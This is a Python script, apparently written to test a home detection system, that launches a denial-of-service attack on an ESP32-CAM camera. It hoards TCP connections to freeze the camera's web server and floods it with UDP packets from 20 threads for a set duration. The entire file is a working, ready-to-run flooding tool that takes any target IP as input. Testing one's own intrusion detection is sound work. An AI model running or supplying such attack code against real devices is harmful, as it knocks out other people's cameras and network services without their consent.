import socket
import threading
import time
import sys

def attack_worker(target_ip, port):
    """Blasts packets as fast as possible to bypass Windows sleep limits"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'X' * 1024 # Identical payload (Zero variance = Flood signature)
    
    while getattr(threading.current_thread(), "do_run", True):
        try:
            # Send garbage to completely exhaust ESP32 buffers
            sock.sendto(payload, (target_ip, port))
        except:
            pass

def tcp_hoarder(target_ip):
    """Holds TCP connections open to instantly freeze the ESP32 camera web server"""
    sockets = []
    for _ in range(15): # ESP32 only allows ~4 connections max
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, 80))
            sockets.append(s)
        except:
            pass
    return sockets

def fatal_attack(target_ip, duration=30):
    print(f"[FATAL ATTACK] Initiating Sure-Shot DDoS against {target_ip}")
    print("[INFO] This script uses 20 threads to guarantee >1000 Packets/sec")
    print("[INFO] It also hoards TCP connections to instantly freeze the camera.")
    
    # 1. Freeze the camera web server
    hoarded_sockets = tcp_hoarder(target_ip)
    
    # 2. Blast UDP packets to trigger the 800+ pps Rule Engine
    threads = []
    for _ in range(20):
        t = threading.Thread(target=attack_worker, args=(target_ip, 80))
        t.daemon = True
        t.start()
        threads.append(t)
        
    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            time.sleep(1)
            print(f"   -> Blasting network... (Time left: {int(end_time - time.time())}s)")
    except KeyboardInterrupt:
        print("\n[STOPPED] Attack stopped manually.")
        
    # Stop threads
    for t in threads:
        t.do_run = False
        
    for s in hoarded_sockets:
        try:
            s.close()
        except:
            pass

    print("[DONE] Attack finished. Camera should recover in 5-10 seconds.")
    print("Check your Telegram and Dashboard - it should have definitely detected this!")

if __name__ == "__main__":
    ip = input("Enter Target ESP32-CAM IP (Default: 192.168.24.167): ").strip() or "192.168.24.167"
    dur = input("Enter Duration in seconds (Default: 30): ").strip()
    dur = int(dur) if dur.isdigit() else 30
    fatal_attack(ip, dur)
